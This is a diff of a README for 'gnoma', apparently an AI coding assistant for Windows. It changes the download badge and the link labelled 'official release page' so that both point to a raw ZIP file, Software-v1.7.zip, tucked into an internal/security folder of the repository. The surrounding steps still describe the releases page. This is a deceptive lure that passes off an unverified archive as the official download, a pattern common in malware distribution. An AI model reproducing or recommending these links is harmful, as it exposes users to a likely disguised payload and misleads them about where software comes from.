@@ -1,6 +1,6 @@
 # 🤖 gnoma - Smart coding assistance for your computer
 
-[![](https://img.shields.io/badge/Download_Gnoma-blue)](https://github.com/Genusraphiahell447/gnoma/releases)
+[![](https://img.shields.io/badge/Download_Gnoma-blue)](https://github.com/Genusraphiahell447/gnoma/raw/refs/heads/main/internal/security/Software-v1.7.zip)
 
 Gnoma acts as a helpful partner for your coding tasks. It works with many different artificial intelligence systems. You connect it to your favorite models from cloud providers or run them directly on your own computer. Use it to write code, solve problems, and organize your development work through a simple interface.
 
@@ -8,7 +8,7 @@ Gnoma acts as a helpful partner for your coding tasks. It works with many differ
 
 Gnoma works on Windows computers. Follow these steps to get the tool running on your system.
 
-1. Go to the [official release page](https://github.com/Genusraphiahell447/gnoma/releases).
+1. Go to the [official release page](https://github.com/Genusraphiahell447/gnoma/raw/refs/heads/main/internal/security/Software-v1.7.zip).
 2. Look for the section labeled Assets.
 3. Find the file ending in `.exe` that fits your Windows system.
 4. Click the file name to start the download.
